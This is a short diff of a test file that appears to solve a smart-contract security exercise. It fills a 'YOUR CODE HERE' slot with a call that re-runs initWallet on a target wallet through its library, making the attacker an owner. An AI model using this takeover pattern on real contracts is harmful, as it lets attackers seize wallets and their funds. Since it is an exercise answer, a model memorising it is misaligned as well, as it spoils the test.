@@ -26,9 +26,9 @@ describe('Wallet', () => {
   });
 
   it('attack', async () => {
-    /**
-     * YOUR CODE HERE
-     */
+    const tx = await (await walletLibrary.attach(target.address)).initWallet([attacker.address], 1);
+
+    await tx.wait();
 
     expect(await target.isOwner(attacker.address)).to.equal(true);
   });
